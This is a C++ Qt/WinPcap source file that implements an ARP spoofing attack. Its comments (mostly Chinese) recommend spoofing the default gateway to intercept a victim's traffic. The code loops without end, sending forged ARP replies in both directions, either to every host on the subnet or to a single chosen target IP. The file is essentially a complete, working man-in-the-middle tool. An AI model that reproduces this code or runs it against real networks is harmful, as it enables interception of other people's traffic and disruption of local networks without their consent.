#include "thread_arp.h"

thread_arp::thread_arp()
{

}
void thread_arp::init(pcap_if_t *d, pcap_if_t *inalldevs, char *ip, int inop, char *dip){
    dev_if_t=d;
    alldevs=inalldevs;
    strcpy(ipaddr,ip);
    op=inop;
    if(dip){
        strcpy(dipaddr,dip);
    }
}

void thread_arp::run(){
    quint16 arp_op=ARP_RESPONCE;
    pcap_if_t *alldevs;							// 网络适配器链表结构
    pcap_if_t *d;								// 适配器链表节点定位指针
    pcap_addr_t* paddr;							// 网卡地址
    u_int ip;									// 32位IPV4地址
    u_int netmask;								// 32位IPV4地址的子网掩码
    u_char mac[MAC_LEN];						// 128位MAC地址
    u_int dst_ip;
    pcap_t *adhandle;							// pcap句柄
    u_int fake_ip;

    char errbuf[PCAP_ERRBUF_SIZE];
    ///////////////////////////////////// Winpcap 基本代码段 /////////////////////////////////////

    // 获得设备列表
    if (pcap_findalldevs_ex((char *)PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1)
    {
        qDebug( "Error in pcap_findalldevs: %s\n", errbuf);
        return ;
    }
    d=dev_if_t;
    //打开设备
    if ((adhandle = pcap_open(d->name,  // 设备名
        65536,		// 要捕捉的数据包的部分
                    // 65535保证能捕获到不同数据链路层上的每个数据包的全部内容
        PCAP_OPENFLAG_PROMISCUOUS,      // 混杂模式
        1000,      // 读取超时时间
        NULL,      // 远程机器验证
        errbuf     // 错误缓冲池
        )) == NULL)
    {
        qDebug("\nUnable to open the adapter. %s is not supported by WinPcap\n", d->name);
        pcap_freealldevs(alldevs);
        return;
    }
    ///////////////////////////////////// ARP 欺骗 /////////////////////////////////////

        // 用户输入假的 IP
        // 由于网络内主机发送的数据包都要经过路由器, 建议将 fake IP 设为"默认网关",
        // 以此截获被攻击主机发往路由器的数据包.
        qDebug("\nInput a fake IP (default gateway is recommanded): ");
        qDebug("ipaddr = %s\n", ipaddr);
        fake_ip = inet_addr(ipaddr);

        // 得到所选网卡的一个地址及其掩码
        BOOLEAN bOk = FALSE;
        for (paddr = d->addresses;paddr;paddr = paddr->next)
        {
            ip = ((struct sockaddr_in *)(paddr->addr))->sin_addr.S_un.S_addr;
            netmask = ((struct sockaddr_in *)(paddr->netmask))->sin_addr.S_un.S_addr;

            if ((ip & netmask) != (fake_ip & netmask))
                continue; // ip 和 fake_ip 不在同一子网, 继续遍历地址列表

            if (ip && netmask)
            {
                bOk = TRUE;
                break;
            }
        }
        if (!bOk)
        {
            qDebug("\nIP addr error");
            pcap_freealldevs(alldevs);
            return;
        }

        // 获取本机 MAC 地址
        if (!GetSelfMac(d->name + 8, mac)) // `+8` 跳过"rpcap:\\"
        {
            qDebug("\ndriver error");
            pcap_freealldevs(alldevs);
            return;
        }

        // 获取网络参数
        u_int netsize = htonl(~netmask) - 1; // 子网内可容纳的主机数 (除去主机地址全0的网络地址和全1的广播地址)
        u_int net = ip & netmask; // 网络地址

        u_char packet[sizeof(arp_packet)]; // ARP 数据包

        // 用户选择攻击类型
        qDebug("\nYou wanna attack all hosts in the network(1) OR a particular one(2)? ");
        qDebug("op = %d", op);
        if (op == 1)
        {
            // 持续向子网内的所有主机发送 ARP 请求报文
            qDebug("\nsending ARP packet...");
            for (;;)
            {
                for (u_int host = 1;host <= netsize;host++)
                {
                    dst_ip = net | htonl(host);
                    make_arp_packet(packet, mac, fake_ip, dst_ip,arp_op);
                    if (pcap_sendpacket(adhandle, packet, sizeof(packet)) == -1) {
                        qDebug("\npacket sending error");
                    }
                    make_arp_packet(packet,mac,dst_ip,fake_ip,arp_op);
                    if (pcap_sendpacket(adhandle, packet, sizeof(packet)) == -1) {
                        qDebug("\npacket sending error");
                    }
                    QThread::msleep(MSLEEP_TIME);
            }
          }
        }
        else if (op == 2)
        {
            // 选定局域网内一台主机进行攻击
            qDebug("\nInput target IP: ");
            qDebug("%s", dipaddr);
            dst_ip = inet_addr(dipaddr);
            if ((dst_ip & netmask) == (ip & netmask)) // 被攻击主机与本机必须处在同一网络内
            {
                // 无限循环, 持续发包
                qDebug("\nsending ARP packet...");
                for (;;)
                {

                    make_arp_packet(packet, mac, fake_ip, dst_ip,arp_op);
                    if (pcap_sendpacket(adhandle, packet, sizeof(packet)) == -1) {
                        qDebug("\npacket sending error");
                    }

                    make_arp_packet(packet,mac,dst_ip,fake_ip,arp_op);
                    if (pcap_sendpacket(adhandle, packet, sizeof(packet)) == -1) {
                        qDebug("\npacket sending error");
                    }
                    QThread::msleep(MSLEEP_TIME);
                }
            }
            else
            {
                qDebug("\ntarget host must be in the same network with you");
            }
        }
        else
        {
            qDebug("\ninvalid input");
        }

        pcap_freealldevs(alldevs);

        return;

}

BOOLEAN thread_arp::GetSelfMac(
    _In_ PCHAR AdapterName,
    _Out_ PUCHAR MacAddr)
{
    LPADAPTER lpAdapter = PacketOpenAdapter(AdapterName);
    if (!lpAdapter || (lpAdapter->hFile == INVALID_HANDLE_VALUE))
    {
        qDebug("#Error#-%d\n", GetLastError());
        return FALSE;
    }

    PPACKET_OID_DATA pOidData = (PPACKET_OID_DATA)malloc(sizeof(PACKET_OID_DATA) + MAC_LEN); // 查看结构体定义，结合MAC地址的长度，便可知道'+6'的含义
    if (pOidData == NULL)
    {
        PacketCloseAdapter(lpAdapter);
        return FALSE;
    }

    // Retrieve the adapter MAC querying the NIC driver
    pOidData->Oid = OID_802_3_CURRENT_ADDRESS; // 获取 MAC 地址
    pOidData->Length = MAC_LEN;
    memset(pOidData->Data, 0, MAC_LEN);

    BOOLEAN bOk = PacketRequest(lpAdapter, FALSE, pOidData);
    if (bOk)
    {
        memcpy(MacAddr, pOidData->Data, MAC_LEN);
    }
    free(pOidData);
    PacketCloseAdapter(lpAdapter);
    return bOk;
}

void thread_arp::make_arp_packet(u_char* packet, u_char* src_mac, u_int src_ip, u_int dst_ip,quint16 op)
{
    arp_packet arp_pkt;

    // -----------------填充以太网首部-----------------
    // 源 MAC
    memcpy(arp_pkt.eh.s_mac, src_mac, MAC_LEN);
    // 目标 MAC 地址为广播地址 FF-FF-FF-FF-FF-FF
    memset(arp_pkt.eh.d_mac, 0xFF, MAC_LEN);
    // 以太网上层协议为 ARP
    arp_pkt.eh.type = htons(ETHPROTOCAL_ARP);

    // -----------------填充 ARP 首部-----------------
    // 硬件类型为 Ethernet
    arp_pkt.ah.ea_hdr.ar_hrd = htons(HARD_ETHERNET);
    // ARP 上层协议为 IPv4
    arp_pkt.ah.ea_hdr.ar_pro = htons(ETHPROTOCAL_IPV4);
    // 硬件地址长度为 MAC_LEN
    arp_pkt.ah.ea_hdr.ar_hln = MAC_LEN;
    // 协议地址长度为 IP_LEN
    arp_pkt.ah.ea_hdr.ar_pln = IPV4_LEN;
    // 操作选项
    arp_pkt.ah.ea_hdr.ar_op = htons(op);
    // 目标 MAC 地址, 填充0
    memset(arp_pkt.ah.arp_tha, 0, MAC_LEN);
    // 目标 IP 地址
    *(uint*)arp_pkt.ah.arp_tpa = dst_ip;
    // 源 MAC 地址
    memcpy(arp_pkt.ah.arp_sha, src_mac, MAC_LEN);
    // 源 IP 地址
    *(uint*)arp_pkt.ah.arp_spa = src_ip;

    memset(arp_pkt.padding, 0xCC, sizeof(arp_pkt.padding));
    memcpy(packet, &arp_pkt, sizeof(arp_pkt));
}
